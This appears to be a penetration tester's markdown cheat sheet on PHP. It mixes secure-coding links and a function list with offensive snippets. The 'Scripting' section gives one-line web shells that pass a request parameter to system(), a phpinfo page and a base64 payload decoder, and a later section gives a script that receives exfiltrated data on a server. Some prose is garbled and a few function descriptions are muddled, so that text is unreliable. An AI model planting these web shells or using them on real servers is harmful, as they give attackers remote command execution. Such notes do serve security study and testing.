# Useful PHP

[RTFM here is a documentation](https://www.php.net/) below is just useful PHP with description how its workings. One of the many Web-Hackronomicons of eye-brow-raising levels of secure language design with the insanity of multiple function calls capable of doing the exact same thing. Try to remember which are all of the vulnerable code in which server context and user context when humans like trust and favourites, where is the person that shouts remember the Pwhpaarrr 1.69 version of with a similar function called that is allowed by some design loop hole. 

## Secure PHP

[OWASP PHP Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
[PHP The Right Way: Security](https://phptherightway.com/#security)
[Secure Coding in PHP](https://www.php.net/manual/en/security.php)

## General information

PHP 8.1 - Dev has a Backdoor

PHP webserver
```bash
php -S 0.0.0.0:8000
```

Execute file:
```bash
php file.php
```


```php

// comm/ents
```


## Useful Functions listing

Regex
[preg_match](https://www.php.net/manual/en/function.preg-match.php) - Perform a regular expression match

[is_resource](https://www.php.net/manual/en/function.is-resource.php) - Finds whether a variable is a resource

Arrays
[array_shift](https://www.php.net/manual/en/function.array-shift.php) - Shift an element off the beginning of array

Strings 
[explode](https://www.php.net/manual/en/function.explode.php) - Split a string by a string
[implode](https://www.php.net/manual/en/function.implode.php) - Join array elements with a string

Files
[finfo_open](https://www.php.net/manual/en/function.finfo-open.php) - Create a new finfo instance
[move_uploaded_file](https://www.php.net/manual/en/function.move-uploaded-file.php) - Moves an uploaded file to a new location
[file_put_contents](https://www.php.net/manual/en/function.file-put-contents.php)

Execution:
[passthru](https://www.php.net/manual/en/function.passthru.php) - The _passthru_() function is similar to the exec() function in that it executes a command . This function should be used in place of exec() or system() he output from the Unix command is binary data which needs to be passed directly back to the browser. 


## Superglobals

PHP [superglobals](https://www.php.net/manual/en/language.variables.superglobals.php) are variables that are associative arrays that are available in all scopes throughout a script.

The superglobal `$GLOBAL` variable defines globally scope variables
- As of PHP 8.1.0, write access to the entire [`$GLOBALS`](https://www.php.net/manual/en/reserved.variables.globals.php) array is no longer supported


## Scripting

Http `cmd` super global variable function for RCEs  
```php
<?php system($_GET['cmd']); ?>
```
`<?php` is the script tag, `system()`is the function call, `$_GET` is a reserved(in standard libvrary) [superglobal variable for HTTP GET](https://www.php.net/manual/en/reserved.variables.get.php), `['cmd']` ,`;` is line terminating character and finally `?>` is the closing script tag. 

```php
<?php system($_REQUEST['cmd']); ?>
```

phpinfo displayer
```PHP
<?php echo("Hello");phpinfo(); ?>
```

Base64 PHP decoder
```PHP
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

## Vulnerable Functions

[[Vulnerable-PHP-Functions]]

## Webserver Exfiltratation

Curl post data to the webserver to then login to exfiltrate
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Put your horrible PHP in html: [php.net](https://www.php.net/manual/en/language.basic-syntax.phpmode.php)

## References

[HTTP GET superglobal variable](https://www.php.net/manual/en/reserved.variables.get.php)
[php.net](https://www.php.net/) 
[OWASP PHP Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
[PHP The Right Way: Security](https://phptherightway.com/#security)
[Secure Coding in PHP](https://www.php.net/manual/en/security.php)